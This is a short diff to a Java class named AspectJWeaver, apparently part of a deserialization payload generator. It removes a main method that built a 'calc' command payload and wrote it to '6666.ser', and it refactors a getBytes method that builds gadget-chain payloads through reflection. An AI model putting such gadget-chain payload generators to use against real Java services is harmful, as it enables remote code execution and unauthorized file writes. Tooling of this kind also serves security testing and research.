@@ -18,14 +18,8 @@ import java.util.HashSet;
 import java.util.Map;
 
 public class AspectJWeaver {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public static byte[] getBytes(PayloadType type) throws Exception {
         String command = String.valueOf(type);
         int    sep  = command.lastIndexOf(';');
         if (sep < 0) {
@@ -67,7 +61,7 @@ public class AspectJWeaver {
             node = array[1];
         }
 
-        Field keyField = null;
+        Field keyField;
         try {
             keyField = node.getClass().getDeclaredField("key");
         } catch (Exception e) {
